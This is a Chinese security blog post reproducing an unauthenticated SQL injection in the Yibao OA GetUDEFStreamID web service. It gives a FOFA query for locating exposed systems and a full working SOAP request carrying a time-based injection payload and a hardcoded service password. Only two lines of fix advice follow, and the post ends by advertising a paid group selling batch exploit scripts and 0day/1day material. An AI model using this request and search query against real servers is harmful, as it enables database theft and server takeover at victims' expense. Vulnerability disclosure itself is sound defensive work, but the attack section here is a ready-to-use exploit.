#  「漏洞复现」易宝OA GetUDEFStreamID SQL注入漏洞   
冷漠安全  冷漠安全   2024-12-06 11:52  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
易宝OA系统是一种专门为企业和机构的日常办公工作提供服务的综合性软件平台，具有信息管理、 流程管理 、知识管理（档案和业务管理）、协同办公等多种功能。系统内置了多种流程模板，如请假、报销、采购等，企业可以根据自身需求进行定制和优化，实现流程的自动化和规范化管理。支持档案和业务管理，包括知识文档的上传、分类、搜索和分享，有助于企业建立知识库，提高员工的知识水平和业务能力。还具备人事管理、日程安排、邮件通知等多种功能，能够满足企业日常办公的多样化需求。  
  
0x03  
  
漏洞威胁  
  
易宝OA GetUDEFStreamID 接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。  
  
0x04  
  
漏洞环境  
  
FOFA:  
```
app="顶讯科技-易宝OA系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qM4LlMHU2R3BmfonCIHt8ddNuXje8aAvv72HrbfqtjK92Hp5iaHkGOUMsg52EBoFT7Txx4qzBIjXA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /WebService/BasicService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetUDEFStreamID"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUDEFStreamID xmlns="http://tempuri.org/">
      <tableName>';WAITFOR DELAY '0:0:5'--</tableName>
      <webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</webservicePassword>
    </GetUDEFStreamID>
  </soap:Body>
</soap:Envelope>
```  
  
延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qM4LlMHU2R3BmfonCIHt8dia8GlVckJr8Z6lyRnJ4Kjicbfc1WRU1mHibLu8aQ7iawOv57KKnGqs14kA/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qM4LlMHU2R3BmfonCIHt8dHShWIk4gOqZQeBVO9dJalWAkXHwPfy5vTP7UAlJibboVZx05ricrap4Q/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问控制  
  
升级至安全版本  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qM4LlMHU2R3BmfonCIHt8d0xWKnPScVLuL7zI7NE5C5qiaaHuOdZgCFUNhEibfgKfeAjIwH83ffowg/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qM4LlMHU2R3BmfonCIHt8dzkWJm8VyJVkfSDpxXb4jQia9t64ZZ5BlCic0XJ56ibDkpNiaEsUaXj5KMQ/640?wx_fmt=gif&from=appmsg "")  
  
  
